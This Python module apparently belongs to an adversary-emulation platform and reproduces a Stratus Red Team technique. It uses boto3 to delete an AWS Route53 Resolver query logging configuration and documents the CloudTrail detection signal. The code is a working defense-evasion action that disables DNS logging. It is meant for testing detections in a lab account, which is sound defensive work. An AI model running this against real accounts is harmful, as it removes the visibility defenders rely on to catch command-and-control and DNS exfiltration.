"""
Technique : aws.defense-evasion.dns-delete-logs
Tactic    : Defense Evasion (T1562.008 - Impair Defenses: Disable or Modify Cloud Logs)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/

How the attack works:
  An attacker with route53resolver:DeleteResolverQueryLogConfig deletes a
  Route53 Resolver query logging configuration, eliminating DNS query visibility
  used to detect C2 and data exfiltration over DNS.

Detection signal:
  - route53resolver:DeleteResolverQueryLogConfig in CloudTrail. Eliminating DNS
    visibility is a high-confidence defense evasion indicator.

Revert:
  - Not reversible from the attack. `pulumi up` recreates the config.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
  Reads `resolver_query_log_config_id` from the Pulumi stack outputs.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    config_id = (outputs or {}).get("resolver_query_log_config_id", "")
    if not config_id:
        raise RuntimeError("Missing required Pulumi output: resolver_query_log_config_id")

    r53_client = _bootstrap_session(outputs, region).client("route53resolver", region_name=region)

    # ── Step 1: Delete the resolver query log config ────────────────────────
    banner("Step 1 - Delete Route53 Resolver query log config (DeleteResolverQueryLogConfig)")
    try:
        r53_client.delete_resolver_query_log_config(ResolverQueryLogConfigId=config_id)
        print(f"  [+] Resolver query log config deleted: {config_id}")
        print("  [!] CloudTrail event: route53resolver:DeleteResolverQueryLogConfig")
        print("  [!] DNS query logging is now DISABLED for associated VPCs.")
    except ClientError as exc:
        print(f"  [!] DeleteResolverQueryLogConfig failed: {exc}")
        raise

    banner("Complete")
    print("CloudTrail event generated: route53resolver:DeleteResolverQueryLogConfig")
